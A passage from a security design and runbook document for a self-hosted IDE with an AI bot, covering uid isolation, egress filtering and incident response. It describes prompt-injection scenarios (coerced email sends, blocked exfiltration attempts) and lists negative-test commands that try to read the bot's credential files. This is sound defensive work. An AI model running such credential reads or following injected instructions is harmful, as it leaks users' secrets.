- **Phase 3 status update (2026-05-11):** the bot-uid leak ("Claude OAuth + Telegram bot token readable by coder") **is now fully closed** via uid 1003 (`bot`) + group `botshare` (1102) + `bot-runner` setuid wrapper. `~/.claude/.credentials.json` and `~/.<bot>/integrations.env` migrated from `/home/coder/` to `/home/bot/` mode 0640 group=botshare. Coder is NOT in botshare → cat returns Permission denied. Validated on the canary client. Below: only the still-open items.
- **GA4** integration runs the upstream Python `ga4-mcp-server` package, which doesn't fit the mcp-runner whitelist (only handles node MCPs under `/opt/ide/apps/`). It stays at uid 1000 with plaintext env injection. GA4 doesn't carry user secrets in env (just `GA4_PROPERTY_ID` + a path to a service-account JSON file), so the practical leak is bounded. Closing this requires generalising mcp-runner to handle whitelisted Python entry points.
- **Email send via prompt injection** — `EMAIL_ALLOW_SEND=yes` accounts can still be coerced into firing `send_email` to attacker recipients. The egress allowlist permits SMTP to gmail/zoho (the integration's purpose), and the recipient address itself isn't gated by a human approval. A "send-approval skill" — Telegram round-trip per outbound mail — is the right fix; tracked separately.
- **Telegram session theft** — a stolen `allowFrom` chat ID is "authentic" to the bot. Not solvable at the bot layer; document as a known model.

#### What this layer protects against

- **Disk snapshot leak** — encrypted store + key are AES-GCM with auth tag, master key not in PROJECT_DIR or backups (restic excludes `**/integrations.key`).
- **Backup repo compromise** — separately encrypted by restic with `RESTIC_PASSWORD`; even with that, ciphertext in the snapshot is unreadable without the master key (held only in `/run/secrets/integrations.key` on the live host).
- **In-container code execution as the bot** — bot at uid 1000 cannot read the key, the store, MCP env, or connect to the broker. Any compromised tool execution still can't extract credentials.
- **Compromised MCP** — MCP at uid 1002 gets only its own credentials at spawn. Cannot read sibling MCP env. Egress allowlist bounds where it can attempt to ship anything it does have to.

**Code references:**
- [ide-template/setuid-wrappers/](../ide-template/setuid-wrappers/) — setuid C wrappers (bot/wsapi/mcp-runner)
- [workspace-api/lib/integrations/broker.js](../ide-template/workspace-api/lib/integrations/broker.js) — UDS broker server
- [apps/_shared/broker-client.js](../ide-template/apps/_shared/broker-client.js) — MCP-side client + global HTTPS_PROXY ProxyAgent
- [workspace-api/lib/integrations/runtime.js](../ide-template/workspace-api/lib/integrations/runtime.js) — `syncMcpServers` issues nonces, no plaintext env
- [entrypoint.sh](../ide-template/entrypoint.sh) — uid setup, store migration, group-share permissions, plugin materialisation
- [docker-compose.yml](../ide-template/docker-compose.yml) — `wsapi-store` volume + `bot-net` internal network
- [scripts/egress-proxy.js](../scripts/egress-proxy.js) — sidecar CONNECT proxy + DNS forwarder

### 19b. Egress filtering — hostname CONNECT proxy + internal Docker network

**Updated 2026-05-14.** Replaces the pre-2026-05-11 host-side iptables + ipset enforcement. The old approach is fully removed at deploy time by `deploy.sh` step 3.5.

**Three-layer structural enforcement (Option A, 2026-05-13 + follow-ups 2026-05-14):**

1. **Docker `internal: true` network.** code-server, frontend, and the egress-proxy sidecar all share `bot-net` which has `internal: true` in `docker-compose.yml`. Docker drops every packet that tries to leave that bridge — there is no NAT path to the host gateway. A process inside code-server cannot reach the internet at all unless it goes through the sidecar.
2. **In-container iptables OUTPUT REDIRECT → redsocks → egress-proxy CONNECT (transparent path).** For libraries that ignore `HTTPS_PROXY` env (bun fetch, imapflow's pre-resolve, nodemailer streams, anything that hard-codes its own dispatcher), entrypoint.sh sets up an in-container iptables NAT chain that REDIRECTs every external TCP packet to a local `redsocks` daemon, which reads `SO_ORIGINAL_DST` and opens an HTTP CONNECT tunnel to the egress-proxy with the original IP. The same proxy filter applies. Required for this to work: `iproute2` in the image (so `ip route replace default via 172.30.0.10` succeeds — without a default route, the kernel rejects connect() with ENETUNREACH before iptables fires) and on-miss DNS resolve in the proxy (so a client picking a CDN IP not in the proxy's `exactIPs` cache triggers fresh `resolve4()` for every allow-listed host).
3. **CONNECT proxy sidecar.** The `egress-proxy` container sits on both `bot-net` (where clients reach it on `:3129`) and the default bridge (where it reaches upstream). It accepts HTTP CONNECT requests only, filters by hostname against `/srv/<ide>/egress/allowed-hosts.txt`, opens TCP tunnels for approved hosts, and replies `403` for anything else. It never decrypts TLS — pure hostname gate. On cache miss for an IP-literal CONNECT, the proxy re-resolves every allow-listed hostname and checks for a match; positive results promote into `exactIPs` + `dnsSnoopCache` for subsequent sync-path lookups.

**Why hostname rather than IP** (the change from the pre-2026-05-11 architecture):

- CDN-fronted APIs round-robin large IP pools; the once-per-60s ipset refresh lost legitimate API endpoints intermittently.
- The same CDN ranges host attacker-controlled endpoints (e.g. `*.pages.dev`, `*.s3.amazonaws.com`). IP-allow of a Cloudflare CIDR would have let a prompt-injected bot exfiltrate to any attacker-uploaded file on the same edge.
- Hostname filtering closes both gaps in a single mechanism.

**Source of truth.** `workspace-api/lib/integrations/egress.js` writes `/srv/<ide>/egress/allowed-hosts.txt` on every integration activate/deactivate. The proxy watches the file with `fs.watchFile` (5s poll) and reloads its allow-list.

**DNS forwarder.** code-server points `dns:` at the proxy's static IP on `bot-net` (`172.30.0.10`) — required because Docker's embedded resolver on an `internal: true` network only resolves inter-container names. The proxy forwards UDP/53 queries to `1.1.1.1` over its default-network interface. DNS is NOT filtered (the CONNECT proxy is the single point of enforcement); a prompt-injected exfil attempt resolves the target hostname fine, then hits 403 at CONNECT.

**Fail-closed posture.** If `allowed-hosts.txt` is missing or unreadable, the proxy denies every request. The `egress-proxy` container has `restart: unless-stopped`, `read_only: true`, `cap_drop: ALL`, `no-new-privileges`, runs as an unprivileged user, and only holds `CAP_NET_BIND_SERVICE` (for the DNS forwarder to bind 53/udp).

**Live verification (canary client, 2026-05-12 post-deploy):**

```
egress-proxy log:
[egress-proxy] ALLOW api.telegram.org:443
[egress-proxy] DENY  raw.githubusercontent.com:443     ← exfil attempt blocked
[egress-proxy] DENY  http-intake.logs.us5.datadoghq.com:443  ← exfil attempt blocked
[egress-proxy] DENY  example.com:443                   ← exfil attempt blocked
```

The DENYs above are real prompt-injection-style attempts caught by the proxy in production.

**Code**:
- [ide-template/workspace-api/lib/integrations/crypto.js](../ide-template/workspace-api/lib/integrations/crypto.js)
- [ide-template/workspace-api/lib/integrations/runtime.js](../ide-template/workspace-api/lib/integrations/runtime.js) (writeFiles + env injection)
- [ide-template/workspace-api/lib/setup.js](../ide-template/workspace-api/lib/setup.js) (`hydrateClaudeCredentials`, `hydrateBotIntegrationsEnv`)

### 19c. Operator runbook — verifying isolation works

The Phase-2/3 isolation has a lot of moving pieces (4 uids, 3 setuid
wrappers, a broker UDS, an egress sidecar). Each one CAN silently
degrade — a missed `chmod +s` on a wrapper, a stale `allowed-hosts.txt`,
a docker secret with the wrong owner. These checks catch the common
regressions quickly. Run all of them after any deploy that touched
`entrypoint.sh`, `Dockerfile`, the setuid-wrappers/, or wsapi's
integration code.

All commands assume `docker exec <ide-container>` context. Substitute
your container name (e.g. `example-ide`).

**Setuid wrappers are present and have the bit:**

```bash
docker exec <ide> ls -la /usr/local/bin/{wsapi,mcp,bot,monitor}-runner
# Expected: -rwsr-xr-x root:root  (note the `s` — that's the setuid bit)
# Missing s → wrapper runs as the caller's uid → coder ends up with
# uid 1000 inside what should be wsapi/mcp/bot — broker rejects, MCPs
# silently fail to fetch credentials.
```

**Broker UDS exists with the right perms:**

```bash
docker exec <ide> ls -la /var/wsapi-store/run/broker.sock
# Expected: srw-rw---- wsapi:wsapi-broker
# Missing → wsapi crashed before binding; check `pm2 logs workspace-api`.
# Wrong owner/group → workspace-api wasn't launched via wsapi-runner.
```

**Coder uid CANNOT reach broker (negative test — should fail):**

```bash
docker exec -u coder <ide> nc -U /var/wsapi-store/run/broker.sock
# Expected: nc: unix connect failed: Permission denied
# If it connects → coder was added to `wsapi-broker` group by mistake;
# integration credentials are now reachable from any code-server terminal.
```

**Master key is owner-only and root-mounted:**

```bash
docker exec <ide> ls -la /run/secrets/integrations.key
# Expected: -r-------- 1 wsapi wsapi   (mode 0400, NOT 0644)
# World-readable → any uid in the container can decrypt the entire store.
```

**Bot's secrets are NOT readable by coder (negative test):**

```bash
docker exec -u coder <ide> cat /home/bot/.bot/integrations.env
# Expected: cat: ...: Permission denied
# If contents print → wrong group or mode; check entrypoint.sh's
# `chgrp botshare` + `chmod 0660` for that file.

docker exec -u coder <ide> cat /home/bot/.claude/.credentials.json
# Expected: Permission denied (mode 0640 group=botshare)
```

**Egress sidecar is running:**

```bash
docker compose ps egress-proxy
# Expected: status `running (healthy)` or similar
# Missing → workspace can't reach the internet at all (Docker
# `internal: true` blocks every other egress path); bot/MCPs fail
# instantly with EHOSTUNREACH or DNS resolution errors.
```

**Egress allowlist is current:**

```bash
docker exec <ide> cat /home/coder/.egress/allowed-hosts.txt
# Should list every hostname every active integration declared via
# mcp.allowedHosts[] in the catalog, plus the always-allowed set
# (anthropic.com, accounts.google.com, etc.). Missing entries =
# workspace-api never wrote the file (check wsapi logs for write
# errors), or activation didn't trigger writeAllowedHostsFile().
```

**Egress proxy is actually filtering (positive + negative tests):**

```bash
# Allowed host should pass:
docker exec <ide> curl -sS -o /dev/null -w '%{http_code}\n' \
  https://api.telegram.org/
# Expected: 401 (Telegram's own auth rejection, NOT a proxy block)

# Random non-allowed host should be rejected at proxy:
docker exec <ide> curl -sS -o /dev/null -w '%{http_code}\n' \
  https://example.com/
# Expected: 000 with stderr `Recv failure` or similar — the proxy
# returns 403 to CONNECT, curl can't establish the tunnel.
```

**Egress proxy logs show ALLOW/DENY decisions:**

```bash
docker logs --tail=50 <ide>-egress-proxy
# Each request gets one line: `[egress-proxy] ALLOW host:port` or
# `[egress-proxy] DENY host:port`. DENY lines for unexpected hostnames
# are the early-warning signal for prompt-injection exfil attempts.
```

**Setuid wrapper refuses to run without the bit (positive test for the
self-check):**

```bash
# Don't run this in production — it breaks the bit on purpose:
# docker exec <ide> chmod u-s /usr/local/bin/mcp-runner
# docker exec -u coder <ide> /usr/local/bin/mcp-runner trello
# Expected stderr: `mcp-runner: setuid bit missing on this binary; refusing to run`
# Then restore: docker exec <ide> chmod u+s /usr/local/bin/mcp-runner
```

**Conversation memory + audit log are intact:**

```bash
docker exec <ide> ls -la /var/wsapi-store/audit.jsonl
# Expected: present, mode 0600 wsapi-only, grows with each activate/
# remove. Missing → either no integration has been activated yet (fine
# on a fresh deploy) or wsapi can't write its store dir.
```

If any of these checks fails on a deploy that USED to pass, treat as a
deployment regression and re-run the relevant entrypoint.sh block — most
of the perms/groups setup is in the root-block at the top of
`entrypoint.sh` and is idempotent on re-run via `docker exec`.

### 20. Plaintext Credential Leak via Stale `.env`

**Attack**: Operator pasted the token into the wizard, but the old `CLAUDE_CODE_OAUTH_TOKEN` (or `SHOPIFY_CLIENT_SECRET`, etc.) is still in `clients/<client>/.env`. Time Machine / iCloud / Dropbox backups of the operator's laptop leak the plaintext even though "everything is encrypted on the server".

**Mitigation**:
✅ **Auto-warning post-migration**
- `migrateFromLegacy()` in workspace-api prints a WARN to PM2 stderr on boot listing exactly which env vars were migrated and should be removed from `.env`.
- `setClaudeToken` also logs a warning when `CLAUDE_CODE_OAUTH_TOKEN` is still in `process.env` after the encrypted store write — a signal the admin forgot to clean up `.env`.

✅ **Idempotent migration** — the admin can run deploy 100 times safely; it's a no-op after the first.

⚠️ **Manual cleanup required** — workspace-api doesn't modify per-client `.env` automatically (that file lives on the operator's laptop, not in the container). The operator must remove the env vars and redeploy.

**Code**: [ide-template/workspace-api/lib/integrations/migration.js](../ide-template/workspace-api/lib/integrations/migration.js), [lib/setup.js](../ide-template/workspace-api/lib/setup.js)

**Result**: The operator gets a clear log message after the first encrypted-store deploy listing what to remove from `.env`.

### 21. Audit Log Tampering / Visibility

**Attack**: A privileged user (admin) changes branding / sets bot personality / rotates the Claude token and tries to hide it from other admins.

**Mitigation**:
✅ **Append-only audit log**
- Every `/api/setup/*` operation (token_set, token_clear, branding_update, avatar_upload, avatar_preset, logo_upload) appends a JSONL line to `PROJECT_DIR/.platform.audit.log`.
- Every `/api/team/*` operation appends to `.allowed-emails.audit.log` (since Phase 3).

✅ **HARD_HIDDEN files**
- `.platform.audit.log`, `.allowed-emails.audit.log`, `.allowed-emails.json`, `.platform.json`, `.platform.token.enc`, `.branding.json` — all in the HARD_HIDDEN list in `lib/config.js`.
- `/api/files/*` returns 404 even with `?include_hidden=true`.
- File watcher SSE stream skips them too.

✅ **Mode 0600** — only the workspace-api process (uid 1000) can read/write. Other processes in the container don't see them.

⚠️ **Limitation** — an attacker with root on the host (Hetzner) can edit the file, because audit doesn't use cryptographic signing. Acceptable — that attacker can also shut down workspace-api entirely. Compliance audit log isn't the project's goal; operational visibility is.

**Code**: [lib/setup.js](../ide-template/workspace-api/lib/setup.js), [lib/team.js](../ide-template/workspace-api/lib/team.js), [lib/config.js](../ide-template/workspace-api/lib/config.js)

**Result**: Admin operations are visible to anyone with shell access on the server; they can't be hidden via the API.

### 22. Rate-limit Exhaustion of Setup Endpoints

**Attack**: A stolen wizard cookie (or admin session post-onboarding) used to spam `/api/setup/branding` hundreds of times to corrupt CLAUDE.md or flood the audit log.

**Mitigation**:
✅ **10/min/IP rate limit**
- `routes/setup.js` has its own in-memory rate limiter — 10 hits per 60s per IP.
- Returns 429 with the message "Too many setup changes."
- Reads (`GET /status`) are not rate-limited.

✅ **Setup endpoints are admin-only post-bootstrap** — non-admins get 403 before reaching the rate limiter.

**Code**: [ide-template/workspace-api/routes/setup.js](../ide-template/workspace-api/routes/setup.js)

**Result**: A coordinated flood requires rotating IPs every 10 hits AND a valid admin cookie — expensive and visible in logs.

---

## Security Checklist

### Pre-Deployment

- [ ] Operator only fills 3 fields per client (`HETZNER_HOST`, `FRONTEND_DOMAIN`, `IDE_ALLOWED_EMAILS`); `bin/bootstrap-client-env.sh` generates `SESSION_SECRET` (256-bit CSPRNG via `openssl rand -hex 32`) and `CODE_SERVER_PASSWORD` (128-bit CSPRNG) on first deploy. Eliminates the "weak/reused secret" class of bug.
- [ ] If you bypass the bootstrap (e.g. legacy client with hand-edited `.env`), generate `SESSION_SECRET` with `openssl rand -hex 32` (required, ≥32 bytes, cryptographically random — not a phrase). Same value in `clients/<client>/.env` AND read by both auth-service AND workspace-api.
- [ ] Set `IDE_ALLOWED_EMAILS` with at least one authorized email (first = admin, rest = members after bootstrap)
- [ ] Register `https://<YOUR_DOMAIN>/auth/callback` in Google Cloud Console OAuth credentials, OR add via `bin/add-redirect-uri.sh <domain>` if shared OAuth is configured
- [ ] Verify `CORS allowedOrigins` only contains production domains
- [ ] Confirm `clients/admin.env` exists (gitignored) with `GOOGLE_CLIENT_ID` + `GOOGLE_CLIENT_SECRET` if using shared OAuth model
- [ ] Confirm `~/.workspace-admin/restic.env` exists on the host with B2 creds before enabling backup cron
- [ ] Test authentication flow end-to-end
- [ ] Verify port 8080 and 3002 not exposed to Internet
- [ ] Enable UFW firewall (only 80/443 open)
- [ ] Setup HTTPS with valid certificate (Caddy automatic)
- [ ] Test rate limiting (attempt 31 logins, verify 429)
- [ ] Verify `TELEGRAM_ALLOWED_IDS` is strictly set (bot runs with `--dangerously-skip-permissions`)
- [ ] Verify `restic-backup.sh` does NOT include `secrets/integrations.key` (run `--dry-run` and inspect paths)
- [ ] Confirm `/srv/<ide>/secrets/integrations.key` is mode 0600, root-owned on the host

### Post-Onboarding (after first wizard run)

- [ ] Remove `CLAUDE_CODE_OAUTH_TOKEN` from `clients/<client>/.env` — token now lives encrypted in `.platform.token.enc`
- [ ] Remove any per-integration env vars (`SHOPIFY_*`, `META_*`, `GOOGLE_ADS_*`, `BYTEPLUS_*`, `GEMINI_*`, etc.) listed in PM2 stderr after `migrateFromLegacy` ran — they're now in the encrypted store
- [ ] Run `./deploy.sh code-server` after `.env` cleanup so the env block in docker-compose stops carrying plaintext
- [ ] Confirm `.platform.audit.log` is being written (`docker exec <ide> ls -la /home/coder/project/.platform.audit.log`)

### Post-Deployment

- [ ] Run [verify.sh](./verify.sh) automated tests
- [ ] Check health endpoint: `curl https://<YOUR_DOMAIN>/auth/health`
- [ ] Verify CORS headers in browser DevTools
- [ ] Test WebSocket connection (IDE loads without errors)
- [ ] Test Google Drive sync (create file in IDE, check Drive)
- [ ] Test logout (cookie cleared, redirected to login)
- [ ] Check Docker logs for errors: `docker logs <IDE_NAME>-auth -f`
- [ ] Monitor auth-service logs for suspicious activity

### Ongoing Maintenance

- [ ] Update Docker images monthly: `docker compose pull && docker compose up -d`
- [ ] Rotate all secrets every 6 months: `cd clients/<name> && ./rotate.sh`
- [ ] After any AI assistant session where `.env` was read — rotate immediately
- [ ] Review `IDE_ALLOWED_EMAILS` quarterly — remove users who no longer need access
- [ ] Audit auth-service logs for suspicious IPs
- [ ] Check code-server logs for unexpected access patterns
- [ ] Subscribe to security advisories:
  - [Caddy](https://github.com/caddyserver/caddy/security/advisories)
  - [nginx](https://nginx.org/en/security_advisories.html)
  - [code-server](https://github.com/coder/code-server/security)

---

## Incident Response

### Suspected Session Hijacking

**Symptoms**:
- User reports unexpected IDE activity
- Logs show access from unknown IP
- Multiple sessions for same user

**Actions**:
1. **Immediate**: Restart auth-service (invalidates all sessions)
   ```bash
   docker restart <IDE_NAME>-auth
   ```

2. **Investigation**:
   - Check auth-service logs: `docker logs <IDE_NAME>-auth --since 24h`
   - Check nginx access logs: `docker exec <IDE_NAME>-frontend cat /var/log/nginx/access.log`
   - Identify suspicious IPs

3. **Remediation**:
   - Rotate `SESSION_SECRET`
   - Force re-login for all users
   - Block suspicious IPs in UFW: `ufw deny from <IP>`

4. **Prevention**:
   - Add IP address logging to session creation
   - Implement IP pinning (session tied to IP)

### SESSION_SECRET Leak

**Symptoms**:
- `SESSION_SECRET` exposed in logs, GitHub, etc.

**Actions**:
1. **Immediate**: Rotate via `./rotate.sh` (auto-generates new SESSION_SECRET)

2. **Redeploy**:
   ```bash
   ./deploy.sh auth
   ```

3. **Verify**:
   - All existing sessions invalidated (users need to re-login)
   - Test login flow works

### Container Compromise

**Symptoms**:
- Unexpected processes in container
- Outbound connections to unknown IPs
- Modified files in `/home/coder/project`

**Actions**:
1. **Immediate**: Isolate compromised container
   ```bash
   docker network disconnect bridge <container-id>
   docker stop <container-id>
   ```

2. **Investigation**:
   - Inspect container: `docker inspect <container-id>`
   - Check logs: `docker logs <container-id>`
   - Extract filesystem: `docker export <container-id> > container.tar`

3. **Remediation**:
   - Rebuild from clean image: `docker compose build --no-cache`
   - Rotate all secrets (`SESSION_SECRET`, etc.)
   - Check Google Drive for unauthorized file changes

4. **Prevention**:
   - Update base images
   - Run containers as non-root (already done for code-server)
   - Add intrusion detection (TODO: Falco)

### Whitelist Bypass

**Symptoms**:
- Unauthorized user accesses IDE
- User not in `allowed_emails` table

**Actions**:
1. **Immediate**: Check auth-service logs
   ```bash
   docker logs <IDE_NAME>-auth | grep "Session created"
   ```

2. **Investigation**:
   - Check auth-service logs for the email's session creation timestamp
   - Verify email is in `IDE_ALLOWED_EMAILS` env var

3. **Remediation**:
   - Remove email from `IDE_ALLOWED_EMAILS` in `.env`
   - Redeploy auth-service: `./deploy.sh auth` (invalidates all sessions)

4. **Prevention**:
   - Add alert for new sessions (Slack webhook)
   - Review whitelist regularly

---

## Security Maintenance

### Regular Updates

**Weekly**:
- Check Docker image updates: `docker compose pull`
- Review auth-service logs for anomalies

**Monthly**:
- Update all Docker images: `docker compose pull && docker compose up -d --build`
- Review `IDE_ALLOWED_EMAILS` — remove access for users who no longer need it
- Check for CVEs: [CVE Details](https://www.cvedetails.com)

**Quarterly**:
- Rotate all secrets using `./rotate.sh` (auto-generates local secrets, prompts for external ones)
- Penetration test (manual or automated)
- Review CORS allowedOrigins list

**Annually**:
- Security audit by external party
- Disaster recovery drill

### Monitoring

**Logs to Monitor**:
1. Auth-service: `docker logs <IDE_NAME>-auth -f`
   - Look for: `ID token verification failed`, `Access denied`

2. Nginx: `docker exec <IDE_NAME>-frontend cat /var/log/nginx/access.log`
   - Look for: 401 responses, unusual IPs

3. Caddy: `docker logs caddy-proxy -f`
   - Look for: TLS errors, connection refused

**Alerts to Setup** (TODO):
- [ ] Slack webhook on authentication failures
- [ ] Email alert on auth-service crashes
- [ ] Prometheus metrics for session count
- [ ] Grafana dashboard for request rates

### Backup & Recovery

**What to Backup**:
1. ✅ Google Drive files (automatic, synced by rclone)
2. ⚠️ Auth-service sessions (RAM only, not persisted)
4. ✅ Docker volumes: `claude-data`, `vscode-config`

**Backup Procedure**:
```bash
# Backup Docker volumes
docker run --rm -v <IDE_NAME>_claude-data:/data -v $(pwd):/backup \
    alpine tar czf /backup/claude-data-backup.tar.gz /data

# Backup .env (contains IDE_ALLOWED_EMAILS and all secrets — keep encrypted)
# cp clients/<name>/.env <secure-backup-location>/.env.bak
```

**Recovery Procedure**:
```bash
# Restore Docker volumes
docker run --rm -v <IDE_NAME>_claude-data:/data -v $(pwd):/backup \
    alpine tar xzf /backup/claude-data-backup.tar.gz -C /

# Restart services
docker compose down && docker compose up -d
```

---

## 📚 Security References

### Standards & Best Practices

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)

### Cryptography

- [RFC 7519 - JWT](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7515 - JWS](https://datatracker.ietf.org/doc/html/rfc7515)
- [RFC 7517 - JWK](https://datatracker.ietf.org/doc/html/rfc7517)
- [ES256 Algorithm](https://www.rfc-editor.org/rfc/rfc7518#section-3.4)

### Tools

- [jwt.io](https://jwt.io) - JWT debugger
- [OWASP ZAP](https://www.zaproxy.org/) - Penetration testing
- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner

